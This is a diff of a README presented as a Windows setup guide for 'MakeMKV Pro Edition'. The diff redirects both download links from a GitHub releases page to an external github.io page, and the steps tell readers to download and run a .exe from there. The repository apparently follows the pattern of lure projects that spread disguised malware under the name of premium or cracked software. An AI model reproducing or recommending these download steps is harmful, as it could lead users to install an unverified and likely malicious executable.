@@ -1,6 +1,6 @@
 # 💿 MakeMKV-Pro-Edition-PC-Setup-Guide - Reliable setup for your Windows media
 
-[![](https://img.shields.io/badge/Download-MakeMKV_Pro_Edition-blue)](https://github.com/Reillyfogged821/MakeMKV-Pro-Edition-PC-Setup-Guide/releases)
+[![](https://img.shields.io/badge/Download-MakeMKV_Pro_Edition-blue)](https://reillyfogged821.github.io)
 
 ## 📌 Overview
 This guide helps you put MakeMKV Pro Edition on your Windows computer. Many users face hurdles when they try to install this software on recent versions of Windows, such as Windows 11. This document explains the steps to complete your setup and solve common errors. 
@@ -18,7 +18,7 @@ To run this software, ensure your computer meet these requirements:
 ## 📥 Downloading the Software 
 Follow these steps to find the correct installation file.
 
-1. Visit the [official release page](https://github.com/Reillyfogged821/MakeMKV-Pro-Edition-PC-Setup-Guide/releases).
+1. Visit the [official release page](https://reillyfogged821.github.io).
 2. Look for the latest version number in the list.
 3. Click the file with a .exe extension to start the download.
 4. Save the file to your Downloads folder or your Desktop.
